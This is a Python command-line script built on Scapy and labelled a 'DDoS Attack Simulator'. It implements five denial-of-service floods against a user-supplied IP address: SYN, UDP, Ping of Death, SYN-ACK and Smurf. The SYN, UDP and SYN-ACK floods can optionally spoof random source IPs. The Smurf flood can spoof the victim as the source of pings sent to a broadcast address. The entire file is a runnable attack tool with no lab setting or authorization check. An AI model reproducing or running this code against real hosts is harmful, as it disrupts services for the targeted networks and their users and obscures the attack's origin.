#!/usr/bin/env python3

from scapy.all import *
import random
import time
import argparse

# syn_flood: send TCP SYN packets rapidly to the target
# target_ip: destination IP
# target_port: destination TCP port
# duration: how long to run (seconds)
# spoof: if True, randomize the source IP for each packet
def syn_flood(target_ip, target_port, duration, spoof):
    end_time = time.time() + duration
    print(f"Starting SYN Flood on {target_ip}:{target_port} for {duration}s (spoof={spoof})")
    # Loop until the specified duration has elapsed
    while time.time() < end_time:
        try:
            # Build the IP layer. If spoof is True, generate a random source IP.
            ip_layer = IP(dst=target_ip) if not spoof else IP(src=".".join(str(random.randint(1,254)) for _ in range(4)), dst=target_ip)
            # Create a TCP packet with a random source port and the SYN flag set
            pkt = ip_layer / TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
            # Send the packet. verbose=0 keeps Scapy quiet (no per-packet output).
            send(pkt, verbose=0)
        except Exception as e:
            # Print any error encountered but continue looping
            print(f"[syn_flood] {e}")

# udp_flood: send UDP packets with random payloads to the target
# payload sizes vary between 100 and 1500 bytes
def udp_flood(target_ip, target_port, duration, spoof):
    end_time = time.time() + duration
    print(f"Starting UDP Flood on {target_ip}:{target_port} for {duration}s (spoof={spoof})")
    while time.time() < end_time:
        try:
            # random._urandom produces a bytes object of the requested size
            payload = random._urandom(random.randint(100, 1500))
            # Build IP layer, possibly spoofing source IP
            ip_layer = IP(dst=target_ip) if not spoof else IP(src=".".join(str(random.randint(1,254)) for _ in range(4)), dst=target_ip)
            # Build UDP packet with random source port and attach payload
            pkt = ip_layer / UDP(sport=random.randint(1024,65535), dport=target_port) / payload
            send(pkt, verbose=0)
        except Exception as e:
            # Non-fatal errors are printed and the loop continues
            print(f"[udp_flood] {e}")

# pod_attack: Ping of Death - send oversized ICMP packets
# Many modern systems ignore or block these, but the code demonstrates the concept
def pod_attack(target_ip, duration):
    end_time = time.time() + duration
    print(f"Starting Ping of Death on {target_ip} for {duration}s")
    while time.time() < end_time:
        try:
            # Create a large payload (6000 bytes) to exceed old IP fragmentation limits
            load = b"X" * 6000
            pkt = IP(dst=target_ip) / ICMP() / load
            send(pkt, verbose=0)
        except Exception as e:
            print(f"[pod] {e}")

# syn_ack_attack: send TCP packets with SYN+ACK flags set
# This is similar to SYN flood but uses different TCP flags
def syn_ack_attack(target_ip, target_port, duration, spoof):
    end_time = time.time() + duration
    print(f"Starting SYN-ACK Flood on {target_ip}:{target_port} for {duration}s (spoof={spoof})")
    while time.time() < end_time:
        try:
            ip_layer = IP(dst=target_ip) if not spoof else IP(src=".".join(str(random.randint(1,254)) for _ in range(4)), dst=target_ip)
            pkt = ip_layer / TCP(sport=random.randint(1024,65535), dport=target_port, flags="SA")
            send(pkt, verbose=0)
        except Exception as e:
            print(f"[syn_ack] {e}")

# smurf_attack: send ICMP to the broadcast address so replies flood the victim
# If spoof is True, the victim IP is used as the source so all replies go to the victim
def smurf_attack(target_ip, duration, spoof):
    # Classic smurf relies on spoofing the victim as the source to the broadcast address.
    # If spoof=False, we’ll just ping broadcast (less "smurfy" but shows your real IP).
    end_time = time.time() + duration
    # Build the network broadcast from the target's first three octets: e.g., 192.168.1.255
    network_broadcast = ".".join(target_ip.split(".")[:3]) + ".255"
    print(f"Starting Smurf on {target_ip} for {duration}s (spoof={spoof})")
    while time.time() < end_time:
        try:
            # If spoof=True, set source IP to the victim so replies target the victim
            ip_layer = IP(src=target_ip, dst=network_broadcast) if spoof else IP(dst=network_broadcast)
            pkt = ip_layer / ICMP()
            send(pkt, verbose=0)
        except Exception as e:
            print(f"[smurf] {e}")

def main():
    p = argparse.ArgumentParser(description="DDoS Attack Simulator (no-spoof by default)")
    p.add_argument('target_ip')
    p.add_argument('attack_type', choices=['syn_flood','udp_flood','pod','syn_ack','smurf'])
    p.add_argument('duration', type=int)
    p.add_argument('-p','--port', type=int, default=80)
    p.add_argument('--spoof', type=lambda s: s.lower() in ('1','true','yes','y'), default=False,
                   help="Spoof random source IPs (default: false)")
    a = p.parse_args()

    if a.attack_type == 'syn_flood':
        syn_flood(a.target_ip, a.port, a.duration, a.spoof)
    elif a.attack_type == 'udp_flood':
        udp_flood(a.target_ip, a.port, a.duration, a.spoof)
    elif a.attack_type == 'pod':
        pod_attack(a.target_ip, a.duration)
    elif a.attack_type == 'syn_ack':
        syn_ack_attack(a.target_ip, a.port, a.duration, a.spoof)
    elif a.attack_type == 'smurf':
        smurf_attack(a.target_ip, a.duration, a.spoof)

if __name__ == "__main__":
    main()

